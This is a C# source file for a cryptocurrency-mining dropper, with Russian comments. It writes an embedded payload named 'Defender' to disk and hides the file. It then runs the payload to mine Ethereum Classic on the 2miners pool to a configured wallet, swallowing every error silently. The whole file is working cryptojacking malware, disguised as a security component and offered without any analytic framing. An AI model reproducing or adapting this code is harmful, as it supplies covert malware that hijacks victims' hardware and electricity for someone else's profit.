using System;
using System.Diagnostics;
using System.IO;

namespace NewMiner
{
    internal class Miner
    {
        public static void Start()
        {
            try
            {
                Process[] pname = Process.GetProcessesByName(Settings.minerProc); //ХВАТИТ!!! ГДЕ МОЙ Settings.cs!!!!!!
                if (pname.Length == 0)
                {
                    if (!File.Exists(Settings.minerPath)) //Если майнера в папке нет(к примеру был удален), то дропаем его из себя в нужную папку, если есть старт
                    {
                        InstallMiner(); //
                        RunMiner();
                    }
                    else
                    {
                        RunMiner();
                    }
                }
            }
            catch { }
        }

        private static void RunMiner() //Это старт
        {
            try
            {
                Process process = new Process();
                process.StartInfo.CreateNoWindow = false;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.Arguments = $"--algo etchash --server etc.2miners.com:1010 --user {Settings.wallet}.{Properties.Settings.Default.gpu} ";
                process.StartInfo.FileName = Settings.minerPath;
                process.Start();
            }
            catch { }
        }

        private static void InstallMiner() //Это ****
        {
            try
            {
                File.WriteAllBytes(Settings.minerPath, Properties.Resources.Defender);
                File.SetAttributes(Settings.minerPath, FileAttributes.Hidden);
            }
            catch { }
        }
    }
}